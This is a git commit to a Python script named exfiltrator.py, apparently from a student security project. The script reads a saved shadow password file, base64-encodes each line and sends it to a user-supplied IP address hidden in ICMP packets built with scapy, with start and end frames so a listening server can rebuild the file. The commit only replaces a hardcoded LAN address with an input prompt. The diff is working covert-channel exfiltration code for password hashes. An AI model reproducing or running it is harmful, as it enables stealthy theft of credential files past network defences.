7029a781cef73918b769dafc8e37e6615d2ce2ce
Durand <emma.durand@ynov.com>
2020-11-01 17:14:21 +0100

    add input ip address

--- exfiltrator.py
+++ exfiltrator.py
@@ -4,18 +4,21 @@ import base64
 filepath = 'save_shaddow'
 
 def send_shadow(filepath):
+    print('Enter IP destination:')
+    ip_dst = input()
     with open(filepath) as fp:
         line = fp.readlines()
-        test = scapy.IP(dst="192.168.43.189")/scapy.ICMP()/"test" # envoi d'une trame "test" pour bien vérifier que notre serveur ne commence l'écoute et reconstitution du fichier que quand il a la bonne trame de début
+        test = scapy.IP(dst=ip_dst)/scapy.ICMP()/"test" # envoi d'une trame "test" pour bien vérifier que notre serveur ne commence l'écoute et reconstitution du fichier que quand il a la bonne trame de début
         scapy.send(test)
-        head = scapy.IP(dst="192.168.43.189")/scapy.ICMP()/"header"
+        head = scapy.IP(dst=ip_dst)/scapy.ICMP()/"header"
         scapy.send(head)
         for data in line:
             encoded = base64.b64encode(data.encode('ascii'))
-            paquet = scapy.IP(dst="192.168.43.189")/scapy.ICMP()/"hash"/encoded
+            paquet = scapy.IP(dst=ip_dst)/scapy.ICMP()/"hash"/encoded
             scapy.send(paquet)
-        end = scapy.IP(dst="192.168.43.189")/scapy.ICMP()/"end"
+        end = scapy.IP(dst=ip_dst)/scapy.ICMP()/"end"
         scapy.send(end)
+        print("End of the program. File send !")
 
 send_shadow(filepath)
 
